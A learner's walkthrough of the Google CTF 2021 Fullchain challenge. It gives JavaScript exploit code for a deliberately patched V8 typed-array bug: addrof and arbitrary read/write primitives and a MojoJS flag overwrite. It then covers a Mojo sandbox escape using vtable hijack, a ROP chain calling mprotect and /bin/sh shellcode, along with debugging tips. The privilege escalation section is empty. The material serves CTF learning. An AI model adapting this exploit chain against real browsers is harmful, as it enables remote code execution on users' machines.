# Introduction

The below writeup is one hacker's attempt to follow yudai's writeup for the Google CTF 2021 Full Chain challenge assuming little browser-exploit knowledge.

# Fullchain

Chromium is built from commit `1be58e78c7ec6603d416aed4dfae757334cd4e1e`. Linux is v5.12.9, you can download the sources from [here](https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.12.9.tar.xz). The VM is built from Debian.

## Setup

This challenge runs in a QEMU vm. Use `run_qemu.py` to run it.

## Challenge files

The original challenge provided comes with QEMU emulator artifacts (Linux kernel, init script, rootfs), a custom kernel module, patch files, and python run scripts.

```bash
-rw-r--r-- 1 user user    9624672 Dec 31  1979 bzImage
drwxrwxr-x 4 user user       4096 Oct 23 12:19 chromium
-rw-r--r-- 1 user user       3587 Dec 31  1979 ctf.c
-rw-r--r-- 1 user user       8160 Dec 31  1979 ctf.ko
-rw-r--r-- 1 user user         14 Dec 31  1979 flag
-rw-r--r-- 1 user user       1255 Dec 31  1979 init
-rw-r--r-- 1 user user        316 Dec 31  1979 README.md
-rw-r--r-- 1 user user 3221225472 Dec 31  1979 rootfs.img
-rw-r--r-- 1 user user        985 Dec 31  1979 run_chromium.py
-rw-r--r-- 1 user user       1619 Dec 31  1979 run_qemu.py
-rw-r--r-- 1 user user       9363 Dec 31  1979 sbx_bug.patch
-rw-r--r-- 1 user user       1158 Dec 31  1979 v8_bug.patch
```

The zip file can be obtained from [here](https://storage.googleapis.com/gctf-2021-attachments-project/c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540)

```bash
$ # Original Filename: c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540

$ ls -l fullchain-zip
-rw-rw-rw- 1 user user  894725817 Oct 23 12:18 fullchain-zip

$ sha256sum fullchain-zip 
b8f0dc28ed5faaa0fa3886add2f1bcdeb9089916e8db226cbddef4b44c64faf5

$ md5sum fullchain-zip 
71a4abab7e587c1f58b530940b14bcfd  fullchain-zip
```

## Prerequisite Reading

The first thing I attempted was a passthrough of yudai's full-chain writeup. Going through it for the first time, I realized there was some prerequisite knowledge that I needed. I bounced around a variety of online references in a jumbled order the first time and so for future readers, below is my recommended order of reading.

1. [Google Chrome Comic](https://www.google.com/googlebooks/chrome/big_00.html) - It might seem kind of silly, but truthfully I had gone through various text resources before coming across this comic that ended up being very digestable and helpful for describing the software architectural design decisions of chrome.
2. [Pointer compression v8 blog](https://v8.dev/blog/pointer-compression) - The next thing I realized I needed to learn was small-integer representation and pointer compression. This concept is crucial for understanding some of the exploit steps in the browser exploit.
3. [Sensepost - Intro to chrome v8 exploit dev](https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/) - This article provided a much needed short overview on the main components of v8.

Below are links to other stuff I read but didn't necessarily end up needing to follow the full-chain writeup.



## Summary of exploit

First, we can break down the tasks we are going to accomplish into three main exploits, they are:

1. Browser exploit
2. Sandbox escape
3. Privilege escalation

**Browser exploit**

The browser exploit will use the vulnerability introduced by [v8_bug.patch](v8_bug.patch). Due to the sandbox, our level of access after exploiting the browser process requires a sandbox escape. 

A vulnerability has been introduced by [sbx_bug.patch](sbx_bug.patch) to permit this possibility by exploiting Mojo, the interprocess-communication (IPC) mechanism. However, mojo is not exposed to javascript by default so we must enable it first.

In summary, the goal of the browser exploit is to:
1. Enable mojo
2. Reload the webpage -> start sandbox escape

First, we analyze the bug introduced into v8. The bug is in a `Torque` function, which is the native-code that represents the behavior of built-in javascript functions.

A small change has been made to the `TypedArrayPrototypeSetTypedArray` function which will impact different `Array` javascript objects.

The call to `CheckIntegerIndexAdditionOverflow` has been removed. Without this bounds-checking function, this means that calling the [set()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set) method on the array can cause a buffer overflow.

In other words, we will write javascript code to trigger this native-code behavior.

A short javascript proof-of-concept code is below:
```javascript
let x = new Uint32Array(8);
let y = new Uint32Array(8);
x.set(y, 4);
console.log(x);
```

We will save the javascript code above as `poc.js`.

To test `poc.js` in chrome, make sure to source the javascript from an html file like so:
```html
<!DOCTYPE html>
<html>
    <head>
        <title>renderer</title>
    </head>
    <body>
        <script src="poc.js"></script>
    </body>
</html>
```

We will call this file `poc.html`.

Ensure the html and js files are in the same directory, then run the code in chrome with the following shell command:
```bash
$ ./chrome --headless --disable-gpu --enable-logging=stderr --user-data-dir=/tmp/userdata ./poc.html
```

You should see a stacktrace for the segmentation fault as below:
```
Received signal 11 SEGV_ACCERR 2d7a512217ff
#0 0x56287fdac5c9 base::debug::CollectStackTrace()
#1 0x56287fd17763 base::debug::StackTrace::StackTrace()
#2 0x56287fdac0f1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7fba8bd593c0 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)
#4 0x56287f484860 Builtins_ObjectToString
  r8: 0000000000000000  r9: 00002d7a08048735 r10: 00002b4a002a4fc9 r11: 0000000000000001
 r12: 00002b4a00508000 r13: 00002b4a00508000 r14: 00002d7a00000000 r15: 00002d7a08204b09
  di: 00000000000080de  si: 00002d7a08203e99  bp: 00007ffe8b8b35a0  bx: 0000000000000000
  dx: 00002d7a08004b71  ax: 00002d7a08048735  cx: 00002d7a51221800  sp: 00007ffe8b8b3578
  ip: 000056287f484860 efl: 0000000000010287 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 00002d7a512217ff
[end of stack trace]
[1024/092801.729053:ERROR:headless_shell.cc(423)] Abnormal renderer termination.
```

An incomplete, simplistic view of memory and the corresponding javascript can be viewed below:
```javascript
let x = new Uint32Array(8);
// x = [ x0 | x1 | x2 | x3 | x4 | x5 | x6 | x7 ]

let y = new Uint32Array(8);
// y = [ y0 | y1 | y2 | y3 | y4 | y5 | y6 | y7 ]

x.set(y, 4);
// copy array y into array x starting at array x index 4
//                copy start -v
// x = [ x0 | x1 | x2 | x3 | y0 | y1 | y2 | y3 ] y4 | y5 | y6 | y7
//                            buffer overflow! --^

console.log(x);
// crash on access
```

Using the `set()` method, the bug provides us an out-of-bounds write exploit primitive since we can control the index into the array as well as the size of the array being copied (effectively specific offsets of adjacent memory).

**addrof primitive**

One of the core building-blocks of a browser exploit is to create the `addrof` primitive. Essentially, `addrof` is a native memory address leak of an arbitrary javascript object.

We can begin by converting the out-of-bounds write into an out-of-bounds read.

We can achieve out-of-bounds read by using the out-of-bounds write to overwrite the length field of an array object. Then, when we read the array object, we read more memory than the object originally intended.

An simplistic view of memory and the corresponding javascript can be viewed below:
```javascript
let y = new Uint32Array(1);
// y = [ y0 ]

let x = new Uint32Array(1);
// x = [ x0 ]

let z = [1.1, 1.1, 1.1, 1.1];
// z = [ 1.1 | 1.1 | 1.1 | 1.1 ]

y.set([2222], 0);
// y = [ 2222 ]

x.set(y, 33);
// offset 33 out-of-bounds -v
// x = [ x0 ] ... ... ... [ 2222 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
// array z's length metadata -^ 

console.log(z.length);
// verify that array z's length field has been overwritten to 1111
```

Running this proof-of-concept code results in the log output:
```
[1024/111758.744535:INFO:CONSOLE(6)] "1111", source: file:///home/user/Public/chromium/poc.js (6)
```

v8 represents integer values in memory with small-integer (SMI) which is why `1111` appears instead of `2222`.

### How to debug chrome?

Let's verify our assumptions with a debugger. But how do we debug chrome?

There are two things that make debugging problematic:
1. The chrome process exits as soon as there is no more javascript code to execute.
2. chrome has multiple processes and we need to attach to the correct process.

To solve the first problem, we can introduce an infinite loop into the javascript code and execute a builtin function that we can break on. My knowledge on the JIT compiler is incomplete so we will hope that the loop will not alter the code unexpectedly.

For example, we will add the following javascript to our POC:
```javascript
let i = 1;
while (i < 10) {
    x.set(y, 33);
}
```

Now, the chrome process will remain running until we attach to it with a debugger.

For the second problem, we can now check the process listing and search for the `renderer` flag in the process command-line.

We can identify the renderer process with the `ps` command.
```bash
$ ps aux | grep chrome | grep render
user        3115  100  1.9 21334356 78004 pts/1  Rl+  21:19   2:08 /home/user/Public/chromium/chrome --type=renderer --headless --lang=en-US --enable-logging=stderr --allow-pre-commit-input --ozone-platform=headless --field-trial-handle=4043824133009562662,633504045566236579,131072 --disable-features=PaintHolding --disable-gpu-compositing --lang=en-US --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=4 --shared-files=v8_context_snapshot_data:100
```

Then connect the debugger and break with `CTRL-C`.
```bash
$ gdb -q --pid 3115
```

On Linux, you may need to disable ptrace yama scope before attaching to the process.

```bash
# echo 0 > /proc/sys/kernel/yama/ptrace_scope
```

In our example of javascript code executed within the infinite loop `x.set(y, 33);`, we will probably break on the native function `Builtins_TypedArrayPrototypeSet`.

Looking at the source code for this function, there is a call to `memmove` that we can break on to verify the source and destination pointers as well as the value being copied. We could also leave magic values in memory and search for them in the debugger.

```
(gdb) b * libc_memmove
(gdb) c
(gdb) p/x $rdx
$1 = 0x4
(gdb) x/wx $rsi
0x310d08048714:	0x000008ae
(gdb) x/wx $rdi
0x310d0804882c:	0x000008ae
```

From the output above, we can see that 4 bytes are copied from rsi to rdi and that the value that is copied is 0x8ae which is 2222.

This confirms that we overwrote the length field of array z as mentioned above to achieve our addrof primitive!

**addrof continued**

We can prepare the target object to be leaked after the array whose length field we have overwritten and read the target object's pointer using the out-of-bounds read.

Let's go through the exercise of getting a simplistic view of what the memory might look like that makes the `addrof` primitive work.

```javascript
function make_primitives() {
    let y = new Uint32Array(1);
    // y = [ y0 ]

    let x = new Uint32Array(1);
    // x = [ x0 ]

    let z = [1.1, 1.1, 1.1, 1.1];
    // z = [ 1.1 | 1.1 | 1.1 | 1.1 ]

    let arr_addrof = [{}];
    // arr_addrof = [ ]

    y.set([0x8888], 0);
    // y = [ 0x8888 ]

    // use out-of-bounds write to achieve out-of-bounds read
    x.set(y, 33);
    // offset 33 out-of-bounds -v
    // x = [ x0 ] ... ... ... [ 0x8888 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
    // array z's length metadata -^ 
    // overwrite with a big length value

    console.log("[+] z.length = " + z.length);
    return [z, arr_addrof];
}
function addrof(obj) {
    arr_addrof[0] = obj;
    // arr_addrof = [ obj ]

    // out-of-bounds read from array z to get the object's pointer
    // z = [ 1.1 | 1.1 | 1.1 | 1.1 ] ... [ obj ]
    // f2i() is a utility function
    return (z[7].f2i() >> 32n) - 1n;
}
let [z, arr_addrof] = make_primitives();
let target = {};

// %DebugPrint(target); // this only works when running the javascript code in d8
// in chrome, you'll get a [1106/090532.695247:INFO:CONSOLE(17)] "Uncaught SyntaxError: Unexpected token '%'"

// see that the addrof worked!
console.log(addrof(target).hex());
```

If you run the above code in chrome, you'll get the following error:
```
[1106/091402.945680:INFO:CONSOLE(13)] "Uncaught TypeError: z[7].f2i is not a function", source: file:///home/user/Public/chromium/v8_exploit.js (13)
```

This is because we are missing some utility functions. Prepend the following utility functions into the javascript code to perform the necessary conversions from float -> int and int -> float.
```javascript
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
```

We'll load up this javascript code and run it in chrome, and find that the address is 32-bit. 

The output looks like:
```
[1106/091114.688124:INFO:CONSOLE(22)] "[+] z.length = 17476", source: file:///home/user/Public/chromium/v8_exploit.js (22)
[1106/091114.691562:INFO:CONSOLE(31)] "0x8242320", source: file:///home/user/Public/chromium/v8_exploit.js (31)
```

But I thought chrome is a 64-bit process now? Internally, pointers are made 32-bit because of pointer compression.

So the leak is not yet complete, we also need to leak the high-pointer to get a full 64-bit address.

**leaking the high pointer**

The TypedArray object is special and contains a full address because its buffer size can be large and so it is allocated in a different heap region.

// TODO: Verify the above statement in the source code

In our `make_primitives()` function, we can add a `Float64Array()` after the array we use for the `addrof()` primitive and use our out-of-bounds read access to read the pointer to this buffer.

This might look like:
```javascript
function make_primitives() {
    let y = new Uint32Array(1);
    ...
    let arr_addrof = [{}];
    // all of our previous code in this function above

    let f_arr = new Float64Array(1);
    // create the typed array
    ...
```

We use offset `28` in array z to obtain the pointer to the full address.
```javascript
let heap_upper = z[28].f2i() & 0xffffffff00000000n;
console.log("[+] heap_upper = " + heap_upper.hex());
```

**arbitrary address primitives**

Our current exploit primitives are:
* out-of-bounds write
* out-of-bounds read 
* addrof
* high pointer leak

The next building block is to achieve an arbitrary-address-read (AAR) and arbitrary-address-write (AAW). The AAR and AAW exploit primitives will provide the ability for us to read and write values from a pointer we specify.

We recently leaked the full address of the buffer for a TypedArray object. We can reuse this full address access and overwrite the pointer to achieve arbitrary-address-write and arbitrary-address-read.

**arbitrary-address-read**
```javascript
function aar64(addr) {
    // overwrite 32-bits of the pointer
    z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
    // overwrite the next 32-bits of the pointer
    z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
    // arbitrary address read
    return f_arr[0].f2i();
}
```

**arbitrary-address-write**
```javascript
function aaw64(addr, value) {
    // overwrite 32-bits of the pointer
    z[28] = ((addr & 0xffffffff00000000n) | 7n).i2f();
    // overwrite the other 32-bits
    z[29] = (((addr - 8n) | 1n) & 0xffffffffn).i2f();
    // arbitrary address write
    f_arr[0] = value.i2f();
}
```

We can view chrome's runtime flags [here](https://source.chromium.org/chromium/chromium/src/+/main:out/Debug/gen/third_party/blink/renderer/platform/runtime_enabled_features.h;l=423?q=is_mojo_js_enabled_&ss=chromium)

This boolean variable will be located in the chrome binary's memory. Our goal then is to leak an address from the chrome binary to obtain the base address.

yudai uses the `HTMLDivElement` object which is represented by the javascript code `let div = document.createElement('div');`.

First, the `heap_upper` high pointer leak and the `addrof` primitive is used to obtain the address of the `div` object.

Then this address is passed to the arbitrary-address-read primitive to read a chrome memory address.

We subtract the offset of the memory address to compute the chrome base address.

We can find this offset using a debugger or our disassembler of choice.

The corresponding javascript code is below:
```javascript
/* Leak chrome base */
let div = document.createElement('div');
let addr_div = heap_upper | addrof(div);
console.log("[+] addr_div = " + addr_div.hex());
let addr_HTMLDivElement = aar64(addr_div + 0xCn);
console.log("[+] <HTMLDivElement> = " + addr_HTMLDivElement.hex());
let chrome_base = addr_HTMLDivElement - 0xc1bb7c0n;
console.log("[+] chrome_base = " + chrome_base.hex());
```

Similarly, we can find the offset for `is_mojo_js_enabled` by using a debugger or our disassembler of choice. We add the offset to our chrome base and use the arbitrary-address-write primitive to flip the bits in the flag.

The corresponding javascript code is below:
```javascript
/* Enable MojoJS */
console.log("[+] Overwriting flags..");
let addr_flag_MojoJS = chrome_base + 0xc560f0en;
aaw64(addr_flag_MojoJS & 0xfffffffffffffff8n, 0x0101010101010101n);
```

**browser exploit cleanup**

After enabling mojo, the web-page must be reloaded which will free the javascript objects, some of which have pointers that have been corrupted. The garbage collector will crash unless we perform a cleanup step.

We can save the original pointer for the TypedArray we use in the arbitrary-address-read-write primitive and restore it at the end of the javascript code before reloading the web-page to the next stage.

```javascript
    let original_28 = z[28];
    let original_29 = z[29];
...
    function cleanup() {
        z[28] = original_28;
        z[29] = original_29;
    }
...
    /* Cleanup */
    cleanup();
    window.location.href = "/sbx_exploit.html";
```

**Sandbox escape**

The sandbox escape will use the vulnerability introduced by [sbx_bug.patch](sbx_bug.patch) which adds a new interface feature to mojo named `CtfInterface`.

The new interface has three methods we can access:
```
interface CtfInterface {
  ResizeVector(uint32 size) => ();
  Read(uint32 offset) => (double value);
  Write(double value, uint32 offset) => ();
};
```

In `ResizeVector`, we can allocate an arbitrary size.
```
void CtfInterfaceImpl::ResizeVector(uint32_t size,
                                    ResizeVectorCallback callback) {
  numbers_.resize(size);
  std::move(callback).Run();
}
```

In `Read` and `Write`, if you follow the `offset` function argument, we have an out-of-bounds index access in an array.
```
void CtfInterfaceImpl::Read(uint32_t offset, ReadCallback callback) {
  std::move(callback).Run(numbers_[offset]);
}
void CtfInterfaceImpl::Write(double value,
                             uint32_t offset,
                             WriteCallback callback) {
  numbers_[offset] = value;
  std::move(callback).Run();
}
```

First, let's verify we can use the javascript mojo bindings to interact with a mojo interface.

We begin by creating the HTML file `sbx_exploit.html` to import the mojo javascript bindings to the `CTFInterface`, then we execute our javascript code.
```html
<!DOCTYPE html>
<html>
    <head>
        <title>browser</title>
        <script src="mojo_bindings/mojo_bindings.js"></script>
        <script src="mojo_bindings/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>
        <script src="mojo_bindings/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    </head>
    <body>
        <script src="sbx_exploit.js"></script>
    </body>
</html>
```

In our javascript code which we will write in `sbx_exploit.js`, we can interact with the `CTFInterface`'s resize, read, and write methods as shown below:
```javascript
// create a new CTFInterface
let ctfi = new blink.mojom.CtfInterfacePtr();
Mojo.bindInterface(blink.mojom.CtfInterface.name, mojo.makeRequest(ctfi).handle, 'context', true);

// resize(size) the interface
ctfi.resizeVector(0x60 / 8); // sizeof(CtfInterface)

// read(offset) from the interface
ctfi.read(0x60 / 8).value.f2i();

// write(value, offset) to the interface
ctfi.write(1.1, 1);
```

A small gotcha is that we have to pass the `--remote-debugging-port=9222` command-line switch to get the mojo code running.

We can also individually test the sandbox escape exploit by enabling mojo with `--enable-blink-features=MojoJS`.

```bash
$ ./chrome --headless --disable-gpu --remote-debugging-port=9222 --enable-blink-features=MojoJS --enable-logging=stderr --user-data-dir=/tmp/userdata ./sbx_exploit.html
```

With arbitrary size allocation, we can spray `CtfInterface` objects that we control into memory along with a vector of the same size.

We search for a pattern that may indicate we are at the right offset in memory.

Then we can use our out-of-bounds access on the same-sized vector and other objects that might also be in nearby memory.

### How to debug mojo code in chrome?

mojo code is executed in the main chrome process rather than the renderer process. To attach the debugger, `ps aux | grep chrome` and pick the process with the lowest process-id. The command-line args will probably look somewhat like:

```bash
user        5141  0.4  2.1 17213080 87108 pts/0  tl+  08:31   0:05 /home/user/Public/chromium/chrome --headless --enable-blink-features=MojoJS --disable-gpu --enable-logging=stderr --remote-debugging-port=9222 --user-data-dir=/tmp/ sbx_exploit.html
```

Upon attaching with `gdb -q --pid 5141`, there should be symbols that you can break on the mojo code in gdb such as `br CtfInterfaceImpl::Read`.

We can use the same trick we performed when debugging the renderer code by inserting an infinite while loop on the function we are interested in debugging.

For example,
```javascript
while (1) {
    await ctfi.read(0);
}
```

Another helpful tip is to use `gef`'s `telescope` command, which we can use to verify what the `CtfInterface` object looks like. This command will dereference pointers found in memory for us.

```
gef➤  telescope 0x3e80090abe0
0x000003e80090abe0│+0x0000: 0x0000559c24a2c4e0  →  0x0000559c1d8de390  →  <content::CtfInterfaceImpl::~CtfInterfaceImpl()+0> push rbp
0x000003e80090abe8│+0x0008: 0x000003e80029d460  →  0x40091eb851eb851f
0x000003e80090abf0│+0x0010: 0x000003e80029d4c0  →  0x60192a00e8030000
0x000003e80090abf8│+0x0018: 0x000003e80029d4c0  →  0x60192a00e8030000
0x000003e80090ac00│+0x0020: 0x8ab06ddd97544553
```

The `CtfInterface` object as it appears in memory is shown above. Offset 0 is the CtfInterface destructor, Offset 8 is the elements pointer for the `std::vector<double> numbers_;`. Our out-of-bounds access is indexed off of the elements pointer.

We can check in the debugger and use the telescope command to view memory that we can access with our out-of-bounds read and view a pattern of memory that contains interesting pointers.

The below pattern shows a pointer to the CtfInterface object at offset 0, a pointer that can be used to compute the elements pointer at offset 0x30, and finally a pointer that can be used to compute the chrome binary's base address at offset 0x38.

```
gef➤  telescope 0x000003e80029d580
0x000003e80029d580│+0x0000: 0x000003e80090abe0  →  0x0000559c24a2c4e0  →  0x0000559c1d8de390  →  <content::CtfInterfaceImpl::~CtfInterfaceImpl()+0> push rbp
0x000003e80029d588│+0x0008: 0x0000000000000000
0x000003e80029d590│+0x0010: 0x0000000000000000
0x000003e80029d598│+0x0018: 0x000003e800824280  →  0x0000559c24b539f0  →  0x0000559c1fab86c0  →  <mojo::internal::MultiplexRouter::~MultiplexRouter()+0> push rbp
0x000003e80029d5a0│+0x0020: 0x000003e800856e20  →  0x0000559c24b53810  →  0x0000559c1fab36e0  →  <mojo::InterfaceEndpointClient::~InterfaceEndpointClient()+0> push rbp
0x000003e80029d5a8│+0x0028: 0x000003e80092c030  →  0x4002840000000001
0x000003e80029d5b0│+0x0030: 0x000003e80029d598  →  0x000003e800824280  →  0x0000559c24b539f0  →  0x0000559c1fab86c0  →  <mojo::internal::MultiplexRouter::~MultiplexRouter()+0> push rbp
0x000003e80029d5b8│+0x0038: 0x0000559c24a2c518  →  0x0000559c1c180110  →  <xsltFreeLocale+0> push rbp
```

We search for this pattern with the following javascript code:
```javascript
async function search() {
    /* Create the target interface we want to find */
    let ctfi = new blink.mojom.CtfInterfacePtr();
    Mojo.bindInterface(blink.mojom.CtfInterface.name,
                       mojo.makeRequest(ctfi).handle, 'context', true);
    await ctfi.resizeVector(12); // sizeof(CtfInterface)
    await ctfi.write(4.20, 0); // write something here to initialize the vector's elements pointer

    /* Find the interface object by searching for the pattern in memory */
    let addr_ctfi = null;
    let addr_elm = null;
    let chrome_base = null;
    for (let i = 1; i < 0x80; i++) {
        let a0 = (await ctfi.read(12 * i + 0)).value.f2i();
        let a1 = (await ctfi.read(12 * i + 1)).value.f2i();
        let a2 = (await ctfi.read(12 * i + 2)).value.f2i();
        if (a0 != 0n && a1 == 0n && a2 == 0n) {
            let a6 = (await ctfi.read(12 * i + 6)).value.f2i();
            let a7 = (await ctfi.read(12 * i + 7)).value.f2i();
            addr_ctfi = a0;
            addr_elm = a6 - 0x18n - BigInt(0x60 * i);
            chrome_base = a7 - 0xbc77518n;
            break;
        }
    }
    if (addr_elm == null) {
        console.log("[-] Bad luck!");
        return location.reload();
    }
    let offset = Number((addr_ctfi - addr_elm) / 8n);
    console.log("[+] offset = " + offset);
    if (offset < 0) {
        console.log("[-] Bad luck!");
        return location.reload();
    }
    console.log("[+] addr_ctfi = " + addr_ctfi.hex());
    console.log("[+] addr_elm = " + addr_elm.hex());
    console.log("[+] chrome_base = " + chrome_base.hex());
}

search();
```

Don't forget to prepend the javascript code with the utilities used in the renderer exploit. The search pattern may fail due to non-determinism and underfitting so just run it again if it fails.

Now that we've found the `CtfInterface` object, we can use our out-of-bounds write and overwrite the element pointer in the `std::vector` object that is the `numbers_` member variable in the `CtfInterface` to achieve arbitrary-address-read and arbitrary-address-write primitives.

```javascript
    async function aar64(addr) {
        await ctfi.write(addr.i2f(),
                         offset + (0x60 / 8) * victim_ofs + 1);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 2);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 3);
        return (await victim.read(0)).value.f2i();
    }
    async function aaw64(addr, value) {
        await ctfi.write(addr.i2f(),
                         offset + (0x60 / 8) * victim_ofs + 1);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 2);
        await ctfi.write((addr + 0x10n).i2f(),
                         offset + (0x60 / 8) * victim_ofs + 3);
        await victim.write(value.i2f(), 0);
    }
```

`victim_ofs` is the offset to the `CtfInterface` spray target we call `victim` whose elements pointers we overwrite. Just to clarify again, `ctfi` is a different `CtfInterface` object from the `victim` `CtfInterface` object.

C++ objects implement methods with virtual function tables. We can achieve program-counter control and redirect control flow by overwriting a vtable pointer of our `victim`.

Then, when the corrupted object's vtable method is triggered, we will stack pivot to execute a ROP chain. A useful ROP chain is to call mprotect on memory to make it executable, then execute that memory as shellcode to support arbitrary payloads.

The below javascript code is used to write the ROP chain to the `ctfi` vector and the shellcode to the `victim` vector.
```javascript
let rop_pop_rdi = chrome_base + 0x035d445dn;
let rop_pop_rsi = chrome_base + 0x0348edaen;
let rop_pop_rdx = chrome_base + 0x03655332n;
let rop_pop_rax = chrome_base + 0x03419404n;
let rop_syscall = chrome_base + 0x0800dd77n;
let rop_xchg_rax_rsp = chrome_base + 0x0590510en
let addr_shellcode = addr_elm & 0xfffffffffffff000n;

// search for victim object vector using arbitrary-address-read
for (let i = 0; i < 0x100; i++) {
    let v = await aar64(addr_shellcode + BigInt(i*0x10+8));
    if (v.i2f() == 1.1) {
	console.log("[+] Found!");
	addr_shellcode += BigInt(i*0x10);
	break;
    }
}
console.log("[+] addr_shellcode = " + addr_shellcode.hex());

// ROP 2 mprotect shellcode, then pivot to shellcode
let rop = [
    rop_pop_rdi,
    addr_shellcode & 0xfffffffffffff000n,
    rop_pop_rsi,
    rop_xchg_rax_rsp,
    rop_pop_rsi,
    0x2000n,
    rop_pop_rdx,
    7n,
    rop_pop_rax,
    10n,
    rop_syscall,
    addr_shellcode
];
// write ROP chain into ctfi's numbers_ vector
for (let i = 0; i < rop.length; i++) {
    await ctfi.write(rop[i].i2f(), i);
}

// write shellcode to victim object's vector using arbitrary-address-write
for (let i = 0; i < shellcode.length; i++) {
    await aaw64(addr_shellcode + BigInt(i*8), shellcode[i].f2i());
}
```

Finally, use the arbitrary-address-write to overwrite the vtable of a `CtfInterface` object and trigger the vtable hijack by executing the `read()` instance method.

```javascript
await aaw64(addr_ctfi, addr_elm);
setTimeout(() => {
    for (let p of spray) {
	p.read(0); // Control RIP
    }
}, 3000);
```

Simply `execve("/bin/sh")` represented by the shellcode below to obtain a shell.
```javascript
let shellcode = [8.689034976057858e-308, 5.629558420881076e-308, 2.814779210440538e-308, 5.272892808344879e-21, -3.754538247695724e-34, 8.931534512674479e+164, 5.4725462592149954e+169, 1.400507102085268e+195, -6.828527034422575e-229];
```

yudai has a nice [ptrlib](https://bitbucket.org/ptr-yudai/ptrlib/src/master/) python library that can be `git clone`d or `pip install`d. It was used here to compile assembly with `nasm` and then chunk the opcodes into 64-bit with `0x90` NOPs as padding. Then the chunks are converted into floats. Finally, sed-like replacement of the `shellcode` variable is performed on the `HTML` file.

**Privilege escalation**


#### References

[original writeup by yudai](https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308)
